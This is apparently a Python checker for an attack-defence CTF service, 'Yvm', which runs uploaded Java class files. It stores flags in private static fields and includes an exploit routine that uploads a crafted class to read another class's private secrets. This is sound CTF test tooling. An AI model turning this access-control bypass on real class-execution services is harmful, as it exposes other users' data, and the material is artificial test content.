import json
import os
import re
import secrets
import string
import subprocess
from itertools import zip_longest
from logging import LoggerAdapter
from typing import Iterable, List, Optional, Tuple

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher, assert_equals, assert_in
from httpx import AsyncClient

NAME_LENGTH = 10

checker = Enochecker("Yvm", 3165)
app = lambda: checker.app


def grouper(iterable, n, fillvalue=None):
    args = [iter(iterable)] * n
    return zip_longest(*args, fillvalue=fillvalue)


def flag_to_ints(flag: str) -> Tuple[int, List[int]]:
    b = flag.encode()
    length = len(b)
    bs = grouper(b, 4, 0)
    ints = [int.from_bytes(b, byteorder="big", signed=True) for b in bs]
    return length, ints


def ints_to_flag(ints: List[int], length: int) -> str:
    bs = [int.to_bytes(i, 4, "big", signed=True) for i in ints]
    b = b"".join(bs)
    return b[:length].decode()


def ints_to_class(name: str, ints: List[int], length: int, acc_lvl: str) -> bytes:
    if acc_lvl == "private":
        data = private_class
    elif acc_lvl == "public":
        data = public_class
    else:
        ValueError("acc_level must be 'private' or 'public'")

    data = data.replace(TMPL_NAME.encode(), name.encode())
    data = data.replace(
        int.to_bytes(TMPL_LENGTH, length=4, byteorder="big"),
        int.to_bytes(length, length=4, byteorder="big", signed=True),
    )

    for i, v in enumerate(ints):
        data = data.replace(
            int.to_bytes(TMPL_VALS_I + i, length=4, byteorder="big"),
            int.to_bytes(v, length=4, byteorder="big", signed=True),
        )

    return data


def gen_class_template(
    name: str, ints: Iterable[int], length: int, acc_lvl: str
) -> str:
    assert acc_lvl in ["private", "public"]

    s = "class " + name + " {\n"
    s += f"  {acc_lvl} static int secret_length = {hex(length)};\n"
    strs = [
        f"   {acc_lvl} static int secret_{str(i)} = {hex(v)};"
        for i, v in enumerate(ints)
    ]
    s += "\n".join(strs) + "\n"
    s += "  public static void main(String[] args) { }\n"
    s += "}\n"
    return s


def gen_name() -> str:
    return "".join(secrets.choice(string.ascii_uppercase) for i in range(NAME_LENGTH))


@checker.putflag(0)
async def putflag_test(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    class_name = gen_name()

    l, ints = flag_to_ints(task.flag)
    class_body = ints_to_class(class_name, ints, l, "private")

    with open(f"{class_name}.class", "wb") as f:
        f.write(class_body)

    files = {"fileToUpload": open(f"{class_name}.class", "rb")}
    r = await client.post("/runner.php", files=files)

    os.remove(f"{class_name}.class")

    assert_equals(r.status_code, 200, "storing class with flag failed")

    if m := re.search(r"href='runner.php\?replay_id=(.*?)'", r.text):
        await db.set("replay_id", m.group(1))
        return class_name
    else:
        raise MumbleException("No replay_id returned by service")


def reconstruct_flag(text: str) -> str:
    if m := re.search(
        r'\(\("secret_length", "I"\),\n *\(\([a-zA-Z. _]*\), ref \(\(Jparser.P_Int (\d*)l\)\)\)',
        text,
    ):
        length = int(m.group(1))
    else:
        raise MumbleException("could not find secret_length in output")

    # [("1", "123"), ("2", "-456"), ...]
    matches = re.findall(
        r'\("secret_(\d*)", "I"\),\n *\(\([a-zA-Z. _]*\), ref \(\(Jparser.P_Int (-?\d*)l\)\)\)',
        text,
    )
    matches = [(int(i), int(v)) for i, v in matches]

    # sort by index
    ints = sorted(matches, key=lambda e: e[0])
    ints = [v for _, v in ints]

    return ints_to_flag(ints, length)


@checker.getflag(0)
async def getflag_test(
    task: GetflagCheckerTaskMessage,
    client: AsyncClient,
    logger: LoggerAdapter,
    db: ChainDB,
) -> None:
    try:
        token = await db.get("replay_id")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    r = await client.get(f"/runner.php?replay_id={token}")
    assert_equals(r.status_code, 200, "getting note with flag failed")
    found = reconstruct_flag(r.text)
    expct = task.flag
    if found != expct:
        logger.error("flag not found")
        logger.error("replay_id " + token)
        logger.error("response body " + r.text)
        logger.error("found '" + found + "'")
        logger.error("expected '" + expct + "'")

    assert_equals(found, expct, "flag not found")


@checker.exploit(0)
async def exploit_test(
    task: ExploitCheckerTaskMessage,
    logger: LoggerAdapter,
    searcher: FlagSearcher,
    client: AsyncClient,
) -> Optional[str]:
    victm_name = task.attack_info
    assert victm_name

    explt_name = "E_" + gen_name()[:8]

    data = accessing_class
    data = data.replace(TMPL_ACCS.encode(), explt_name.encode())
    data = data.replace(TMPL_VCTM.encode(), victm_name.encode())

    with open(f"{explt_name}.class", "wb") as f:
        f.write(data)

    files = {"fileToUpload": open(f"{explt_name}.class", "rb")}
    r = await client.post("/runner.php", files=files)

    os.remove(f"{explt_name}.class")

    return reconstruct_flag(r.text)


@checker.putnoise(0)
async def putnoise_access_public(
    task: PutnoiseCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    class_name = gen_name()

    secret = gen_name()
    l, ints = flag_to_ints(secret)
    class_body = ints_to_class(class_name, ints, l, "public")

    with open(f"{class_name}.class", "wb") as f:
        f.write(class_body)

    files = {"fileToUpload": open(f"{class_name}.class", "rb")}
    r = await client.post("/runner.php", files=files)

    os.remove(f"{class_name}.class")

    assert_equals(r.status_code, 200, "storing class with flag failed")

    await db.set("noise_info", {"class_name": class_name, "secret": secret})


@checker.getnoise(0)
async def getnoise_access_public(
    task: GetnoiseCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    try:
        info = await db.get("noise_info")
    except KeyError:
        raise MumbleException("database info missing")
    victm_name = info["class_name"]
    secret = info["secret"]

    explt_name = "N_" + gen_name()[:8]

    data = accessing_class
    data = data.replace(b"G" * 10, explt_name.encode())
    data = data.replace(b"V" * 10, victm_name.encode())

    with open(f"{explt_name}.class", "wb") as f:
        f.write(data)

    files = {"fileToUpload": open(f"{explt_name}.class", "rb")}
    r = await client.post("/runner.php", files=files)

    os.remove(f"{explt_name}.class")

    assert_equals(reconstruct_flag(r.text), secret, "noise not found")


l = 20
TMPL_NAME = "A" * NAME_LENGTH
TMPL_LENGTH = 0xFEFEFEFE
TMPL_VALS_I = 0xDEADBEEF
cls = gen_class_template(
    TMPL_NAME, range(TMPL_VALS_I, TMPL_VALS_I + l), TMPL_LENGTH, "private"
)
with open("FooFoo.java", "w") as f:
    f.write(cls)

subprocess.run(["javac", "FooFoo.java"], check=True)

with open(f"{TMPL_NAME}.class", "rb") as f:  # type: ignore
    private_class: bytes = f.read()  # type: ignore

cls = gen_class_template(
    TMPL_NAME, range(TMPL_VALS_I, TMPL_VALS_I + l), TMPL_LENGTH, "public"
)
with open("FooFoo.java", "w") as f:  # type: ignore
    f.write(cls)  # type: ignore

subprocess.run(["javac", "FooFoo.java"], check=True)

with open(f"{TMPL_NAME}.class", "rb") as f:  # type: ignore
    public_class: bytes = f.read()  # type: ignore


TMPL_VCTM = "V" * NAME_LENGTH
TMPL_ACCS = "G" * NAME_LENGTH

vtm_class = "class " + TMPL_VCTM + "{\n"
vtm_class += "  static int secret_length;\n"
vtm_class += "}\n"

acc_class = "class " + TMPL_ACCS + "{\n"
acc_class += "  public static void main(String[] args) {\n"
acc_class += "    int result = " + TMPL_VCTM + ".secret_length;\n"
acc_class += "  }\n"
acc_class += "}\n"

with open(f"{TMPL_VCTM}.java", "w") as f:
    f.write(vtm_class)

with open(f"FooFoo.java", "w") as f:
    f.write(acc_class)

subprocess.run(["javac", "FooFoo.java"], check=True)

with open(f"{TMPL_ACCS}.class", "rb") as f:  # type: ignore
    accessing_class: bytes = f.read()  # type: ignore
